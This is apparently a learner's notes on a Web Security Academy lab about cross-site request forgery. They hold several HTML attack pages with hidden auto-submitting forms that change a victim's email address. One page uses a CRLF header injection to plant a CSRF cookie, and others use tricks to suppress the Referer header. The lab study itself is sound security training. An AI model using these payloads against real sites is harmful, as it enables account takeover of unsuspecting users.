This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

>The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

---

temp

```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://bank.com/email/change/" method="post" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test@test.com">
			<input type="hidden" name="csrf" value="CQsVzkB7dcWbPqassMZMhBuv6k0l6iZU">
		</form>
		<img style="display:none;" src="https://bank.com/email/change/?search=hat%0d%0aSet-Cookie:%20csrfKey=<Attacker_CSRFKey_Cookie>" onerror="document.forms[0].submit()">
	</body>
</html>
```

Analysis:

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: no csrf token

Testing Referer header for CSRF attacks:
1. Remove the Referer header

I need to add in the meatadata for the referer:

```html
<html>
    <head>
        <meta name="referrer" content="never"> 
    </head>

    <!--NOTE: Since the Web Security Academy intoduced a defense in that does not allow iframes from different origins, the iframe needs to be removed.-->
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

![[IMG/Pasted image 20240924092929.png]]

```html
<html>
    <head>
        <meta name="referer" content="never"> 
    </head>
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

Works, but doesn't complete the lab.